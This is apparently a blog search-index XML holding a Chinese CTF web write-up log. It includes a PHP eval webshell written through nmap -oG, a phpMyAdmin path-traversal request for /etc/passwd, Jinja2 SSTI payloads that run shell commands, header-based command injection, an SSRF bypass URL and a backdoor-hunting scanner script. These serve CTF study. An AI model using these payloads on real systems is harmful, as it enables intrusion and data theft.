<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Web做题记录1</title>
      <link href="/2021/12/08/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/"/>
      <url>/2021/12/08/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
      
        <content type="html"><![CDATA[<h1 id="Web做题记录1"><a href="#Web做题记录1" class="headerlink" title="Web做题记录1"></a>Web做题记录1</h1><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)                                            <span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;D:/soft/phpstudy/PHPTutorial/WWW/src/&quot;</span></span><br><span class="line">os.chdir(filePath)                                                    <span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>                                <span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>                                             <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()                                                </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:                            <span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;                                                        <span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;                                                        <span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/src/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)            <span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()                                                <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:                                    <span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()                                                <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()                                                <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:                                                    <span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:                                                            <span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>XFF和client-ip都可。发现可以控制输入</p><p>可以进行逻辑运算<code>&#123;7*8&#125;</code></p><p><code>client-ip:&#123;system(&#39;ls&#39;)&#125;</code>发现可以，尝试<code>cat /flag</code></p><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>dirb扫描到后台有phpmyadmin目录，访问一下</p><p>版本为4.81，经查询，存在远程文件读取漏洞</p><p>直接上payload读取passwd文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>读取成功，尝试读取flag文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2020-朱雀组NMap"><a href="#网鼎杯-2020-朱雀组NMap" class="headerlink" title="网鼎杯 2020 朱雀组NMap"></a>网鼎杯 2020 朱雀组NMap</h2><p>知识点</p><ul><li>nmap参数</li><li>后门写入</li></ul><p>‘ <?php @eval($_POST["hack"]);?> -oG hack.php’</p><p>回显hacker 经过调查 可知 php 被过滤 于是 使用短标签绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml&#x27;</span></span><br></pre></td></tr></table></figure><p>成功写入 </p><p>访问</p><p>用蚁剑连接</p><h2 id="第二章-web进阶-SSRF-Training"><a href="#第二章-web进阶-SSRF-Training" class="headerlink" title="[第二章 web进阶]SSRF Training"></a>[第二章 web进阶]SSRF Training</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>); </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>); </span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init(); </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close(<span class="variable">$ch</span>); </span><br><span class="line">        var_dump(<span class="variable">$output</span>); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123; </span><br><span class="line">    safe_request_url(<span class="variable">$url</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>$url=<a href="http://a:%40127.0.0.1%3A80@baidu.com/flag.php">http://a:@127.0.0.1:80@baidu.com/flag.php</a></p><h2 id="Flask-SSTI"><a href="#Flask-SSTI" class="headerlink" title="[Flask]SSTI"></a>[Flask]SSTI</h2><p>payload</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Hello HOSTNAME=d43aec63194a PYTHON_PIP_VERSION=19.3.1 HOME=/root GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D PYTHON_GET_PIP_URL=<a href="https://github.com/pypa/get-pip/raw/ffe826207a010164265d9cc807978e3604d18ca0/get-pip.py">https://github.com/pypa/get-pip/raw/ffe826207a010164265d9cc807978e3604d18ca0/get-pip.py</a> SERVER_SOFTWARE=gunicorn/20.0.0 PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin LANG=C.UTF-8 PYTHON_VERSION=3.6.9 PWD=/app PYTHON_GET_PIP_SHA256=b86f36cc4345ae87bfd4f10ef6b2dbfa7a872fbff70608a1e43944d283fd0eee FLAG=flag{044b09a2-bb0b-4dcb-abac-f4ceb70ff40e} }</p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower() </span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):<span class="comment">#检测是以指定字符开头，不能用这两个协议</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>审计一下源码 这三个是要传的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br></pre></td></tr></table></figure><p>将三个参数传入TASK类中 调用TASK类中的EXEC方法</p><p>分析下三个参数：<br>第一个参数action是传入read和scan的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#需要read 才能读取</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="comment">#action默认参数为scan</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure><p>第二个参数传入一个文件名<code>根据提示是flag.txt</code><br>第三个参数sign是一个md5值<br>最关键就是第三个参数，由于我们不知道secert_key的值，所以不能自己加密，考点应该在这里！</p><p>由于我们并没有secert_key的值，所以本来是没得办法的。</p><p>但是/geneSign路由，暴露了getSign函数，</p><p>我们可以根据路由getSign去得到正确的sign值。</p><p>访问一下geneSign传入参数param=flag.txtread得到一串MD5值：</p><p>f8c0d736fa2e823c2b488c82561c4732</p><p><code>然后让flag.txtread + scan拼接加密md5即为</code>sign</p><p>/Delta?param=flag.txt</p><p>Cookie:action=readscan;sign=f8c0d736fa2e823c2b488c82561c4732;</p><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 